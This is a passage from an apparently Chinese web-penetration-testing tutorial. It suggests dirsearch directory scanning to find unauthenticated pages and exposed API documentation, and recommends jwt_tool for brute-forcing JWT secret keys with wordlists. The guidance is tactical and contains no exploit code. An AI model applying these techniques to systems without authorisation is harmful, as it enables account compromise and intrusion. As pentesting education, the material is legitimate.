可以借助dirsearch工具进行目录扫描

- 无需登录即可访问的页面
- api接口文档：越来越多的网站采用前后端分离来开发，开发完成后api接口文档可直接访问，扫描到api接口文档后可根据文档构造请求包进行测试：

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhh0BVSBKNnUdfMZITcCCxB28oHnX0SFqFxdRxEgmqpPTGC4IVdAPm8w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##  

------



**7. jwt相关**

Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准.该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录

- 爆破密钥: 这里推荐使用jwt_tool工具,字典不用太大爆个top1k/top1w的就差不多了 出不出随缘

- 

```
https://github.com/ticarpi/jwt_tool
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhL9Oj61lNfjZkjFhD9lafsZvicbAV300Y9BrRIjrrACBS0t96v9M0MHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)









